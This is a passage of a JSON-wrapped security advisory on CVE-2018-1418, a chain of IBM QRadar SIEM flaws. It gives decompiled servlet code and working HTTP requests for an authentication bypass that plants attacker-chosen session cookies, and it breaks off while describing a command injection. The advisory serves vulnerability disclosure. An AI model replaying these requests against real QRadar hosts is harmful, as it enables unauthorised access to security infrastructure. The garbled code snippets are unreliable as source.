{
    "text": "vul_name : IBM QRadar SIEM Code Execution / Authentication Bypass ， vul_cve : CVE-2018-1418 ， vul_poc : Hi all ,  ， 3 vulns in IBM QRadar SIEM that when chained allow an attacker to ， achieve unauthenticated RCE as root on the QRadar host. ， IBM have only attributed on CVE for all 3 vulns , and they have a ， combined CVSS score of 5.6. ， So totally own a SIEM = 5.6 CVSS. Sounds right to me. ， A special thanks to Beyond Security's SSD programme , which helped me ， disclose these 3 vulnerabilities. See their advisory at :  ， Also available in my repo :  ， A Metasploit module has been released , and it is pending approval :  ， Regards ,  ， Pedro ， Multiple vulnerabilities in IBM QRadar SIEM ， Discovered by Pedro Ribeiro ( pedrib @ gmail.com )  , Agile Information ， Security (  ， Disclosure : 28/05/2018 / Last updated : 25/08/2018 ， Introduction :  ， From IBM's website [ 1 ]  :  ， \"IBMA ( r ) QRadarA ( r ) SIEM detects anomalies , uncovers advanced threats and ， removes false positives. It consolidates log events and network flow ， data from thousands of devices , endpoints and applications distributed ， throughout a network. It then uses an advanced Sense Analytics engine to ， normalize and correlate this data and identifies security offenses ， requiring investigation. As an option , it can incorporate IBM X-ForceA ( r )  ， Threat Intelligence which supplies a list of potentially malicious IP ， addresses including malware hosts , spam sources and other threats. ， QRadar SIEM is available on premises and in a cloud environment.\" ， Background and summary :  ， QRadar has a built-in server side application to perform forensic ， analysis on certain files. ， The vulnerabilities described below show how two logical bugs in the ， forensics application can be abused to bypass authentication , write a ， file to disk and execute it as an unpriviliged user. This file can then ， abuse a vulnerability in the way cron jobs are handled to cause a shell ， script to be executed as root. In summary , the full exploit chain allows ， an unauthenticated attacker to achieve remote code execution as root ， with a couple of HTTP requests. ， The forensics application is disabled in the free Community Edition , but ， the code is still there , and part of it still works. This application ， has two components , one servlet running in Java , and the main web ， application running PHP. ， QRadar has an Apache reverse proxy sitting in front of all its web ， applications , which routes requests according to the URL. Requests sent ， to /console/ * get routed to the main \"console\" application , which not ， only runs the web interface but also performs the main functions of ， QRadar ( and is not affected by these vulnerabilities ) . ， Then there are several helper applications , such as the forensics ， application described above , which can be reached at /forensics and ， /ForensicAnalysisServlet , the SOLR server , reachable at /solr and others. ， Special thanks to SecuriTeam for helping me disclose this vulnerability. ， Please see their advisory at [ 2 ] and IBM's response at [ 3 ] . ， Note that IBM have attributed a combined CVE for all three ， vulnerabilities , CVE-2018-1418. They have also scored these three ， vulnerabilities as CVSS 5.6. ， A Metasploit module that exploits these vulnerabilities to achieve ， unauthenticated remote code execution as root has been released in [ 4 ] . ， Technical details :  ，  # 1 ， Vulnerability : Authentication Bypass ( in ForensicAnalysisServlet )  ， CVE-2018-1418 ， Attack Vector : Remote ， Constraints : None ， Affected products / versions :  ， - IBM QRadar SIEM : 7.3.0 and 7.3.1 confirmed ; possibly all versions ， released since mid-2014 are affected ， QRadar authentication is done via a SEC cookie , which is a session UUID. ， This is managed centrally by a session manager which runs in the main ， QRadar console application. The SEC cookies can be obtained in three ways :  ， - Upon login in the main console application ， - Using a previously created authorisation token ( also created in the ， console )  ， - From the /etc/qradar/conf/host.token file , which contains a UUID ， generated at install time , used by internal services to perform ， administrative actions. ， The ForensicAnalysisServlet stores the SEC cookie in a HashMap , and then ， checks if the cookie is valid with the console application before ， committing any action. except for one specific codepath. ， The function doGetOrPost (  ) processes all requests to ， ForensicsAnalysisServlet. This function does a number of actions , such ， as fetching a results file , checking the status of an analysis request , etc. ， In order to authenticate , the requester has to have its SEC and ， QRadarCSRF tokens registered with the servlet. This is done by ， application with the setSecurityTokens action , with which a requester ， specifies both tokens and registers them with the servlet. ， In order to perform authentication for the setSecurityTokens action , the ， servlet checks if the host.token SEC cookie was sent with the request. ， However , if the forensicsManagedHostIps parameter is sent with the ， setSecurityTokens action , doGetOrPost (  ) will pass on the request to ， doPassThrough (  ) before authenticating it :  ， protected void doGetOrPost ( HttpServletRequest request ,  ， HttpServletResponse response ) throws InterruptedException , IOException ,  ， ServletException , SolrServerException { ， . ， String SEC = \" ;  ， String QRadarCSRF = \" ;  ， Cookie [  ] requestCookies = request.getCookies (  )  ;  ， Cookie [  ] var6 = requestCookies ;  ， int var7 = requestCookies.length ;  ， Cookie cookie = var6 [ var8 ]  ;  ， SEC = cookie.getValue (  )  ;  ， } ， QRadarCSRF = cookie.getValue (  )  ;  ， } ， } ， } ， the cookies exist , but doesn't validate their values ， String actionParameterValue = \" + request.getParameter ( \"action\" )  ;  ， actionParameterValue = actionParameterValue.trim (  )  ;  ，  ! actionParameterValue.isEmpty (  ) { ， String solrDocIdsString = \" ;  ， String responseHash ;  ， the parameter is setSecurityTokens , doesn't validate the cookies ，  ! this.QRadarCSRFCookiesMap.containsKey ( QRadarCSRF ) { ， logger.error ( \"No valid forensics analysis SEC or QRadarCSRF ， cookie ( s ) found.\" )  ;  ， response.setStatus ( 403 )  ;  ， } ， solrDocIdsString = \" + request.getParameter ( \"solrDocIds\" )  ;  ， solrDocIdsString.trim (  ) .isEmpty (  ) { ， BufferedReader bufferedReader = request.getReader (  )  ;  ， solrDocIdsString = \" ;  ，  ! = null ; solrDocIdsString = solrDocIdsString + responseHash ) { ，  ;  ， } ， bufferedReader.close (  )  ;  ， } ， } ， String forensicsManagedHostIps = \" + ， request.getParameter ( \"forensicsManagedHostIps\" )  ;  ， forensicsManagedHostIps = forensicsManagedHostIps.trim (  )  ;  ， throw new ServletException ( \"No valid forensics analysis ， forensicsManagedHostIps parameter found.\" )  ;  ， } ， responseHash = InetAddress.getLocalHost (  ) .getHostAddress (  )  ;  ， forensicsManagedHostIps = ， forensicsManagedHostIps.replaceAll ( responseHash , \" )  ;  ， this.doPassThrough ( request , response , forensicsManagedHostIps ,  ， solrDocIdsString , actionParameterValue )  ; <- if the ， forensicsManagedHostIps parameter is set , call doPassThrough ， } ， } ， . ， } ， doPassThrough (  ) also validates if the request contains a valid SEC ， cookie. at some point. The problem is that if we send the ， setSecurityTokens action , in the beginning of the function the SEC and ， QRadarCSRF values are added to the servlet HashMap of valid tokens. ， before being validated :  ， private void doPassThrough ( HttpServletRequest request ,  ， HttpServletResponse response , String forensicsManagedHostIps , String ， solrDocIdsString , String actionParameterValue ) throws IOException ,  ， ServletException { ， String method = request.getMethod (  ) .toUpperCase (  )  ;  ， String securityTokensString = \" ;  ， String [  ] securityTokens = null ;  ， RequestBuilder requestBuilder = RequestBuilder.create ( method )  ;  ， String QRadarCSRF ;  ， requestBuilder.setEntity ( new StringEntity ( solrDocIdsString , \"UTF-8\" )  ;  ， } else { ， BufferedReader bufferedReader = request.getReader (  )  ;  ， null ; securityTokensString = securityTokensString + QRadarCSRF ) { ，  ;  ， } ， bufferedReader.close (  )  ;  ， securityTokens = securityTokensString.split ( \" , \" )  ;  ， this.SECCookiesMap.put ( securityTokens [ 2 ]  , Long.valueOf ( new ， Date (  ) .getTime (  )  ; <- POST values are added here if the ， setSecurityTokens parameter is set ， this.QRadarCSRFCookiesMap.put ( securityTokens [ 3 ]  , Long.valueOf ( new ， Date (  ) .getTime (  )  ;  ， } ， } ， . ， } ， Following the code snippets above , it is clear that an unauthenticated ， user can insert arbitrary SEC and QRadarCSRF values into the servlet ， cookie HashMaps. ， To show this in action , let's try to do a request to the servlet , and we ， get a 403 error :  ， Request :  ， GET /ForensicsAnalysisServlet/?action=someaction HTTP/1.1 ， Cookie : SEC=owned ; QRadarCSRF=superowned ;  ， Response :  ， HTTP/1.1 403 Forbidden ， Now we send our request to add the SEC and QRadarCSRF values to the ， valid token lists :  ， By sending the following request , the values \"owned\" and \"superowned\" ， are added to the valid SEC and QRadarCSRF tokens :  ， POST ， /ForensicsAnalysisServlet/?action=setSecurityTokens&forensicsManagedHostIps=something ， HTTP/1.1 ， Cookie : SEC=owned ; QRadarCSRF=superowned ;  ， Content-Type : application/json ， Content-Length : 44 ， something1002 , something1003 , owned , superowned ， To which the server will respond :  ， HTTP/1.1 200 OK ， {\"exceptionMessageValue\" : \"javax.servlet.ServletException : No valid ， forensics analysis host token data found.\"} ， And now our cookies have been added to the SECCookiesMap and ， QradarCSRFCookiesMap , so we can invoke all actions ( even the ones that ， required authenticated cookies ) in ForensicsAnalysisServlet. ， So let's try to repeat the initial request , for which we got a 403 :  ， GET /ForensicsAnalysisServlet/?action=someaction HTTP/1.1 ， Cookie : SEC=owned ; QRadarCSRF=superowned ;  ， Response :  ， HTTP/1.1 200 OK ， {\"exceptionMessageValue\" : \"javax.servlet.ServletException : No valid ， forensics analysis solrDocIds parameter found.\"} ， Success ! We've bypassed authentication. ，  # 2 ， Vulnerability : Command Injection ( in PHP web application )  ， CVE-2018-1418 ， Attack Vector : Remote ， Constraints : Authentication needed ( can be bypassed with vulnerability # 1 )  ， Affected products / versions :  ， - IBM QRadar SIEM : 7.3.0 and 7.3.1 confirmed ; possibly all versions ， released since mid-2014 are affected ， The second vulnerability in this exploit chain is in the PHP part of the ， forensics web application. ， Using vulnerability # 1 to add our SEC and QRadarCSRF cookies to the ， ForensicAnalysisServlet HashMaps means that we can invoke any function ， in the Java part of the application , but the PHP part uses a separate ， authentication scheme which doesn't have a similar flaw. ， However , it accepts any requests coming from localhost without needing ， authentication. Authentication is done in the PHP part by including the",
    "time": "2018.05.31"
}